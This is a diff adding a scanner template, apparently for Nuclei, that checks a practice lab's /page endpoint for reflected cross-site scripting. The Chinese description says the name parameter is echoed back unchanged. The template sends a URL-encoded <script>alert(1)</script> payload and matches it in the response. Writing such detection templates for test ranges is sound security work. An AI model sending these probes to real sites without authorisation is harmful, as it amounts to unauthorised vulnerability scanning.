@@ -1,0 +1,21 @@
+id: sentinel-lab-xss-reflected
+
+info:
+  name: Sentinel Lab 反射型 XSS
+  author: sentinel
+  severity: medium
+  description: 靶场 /page 的 name 参数原样回显, 存在反射型 XSS
+  tags: xss,lab
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/page?name=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
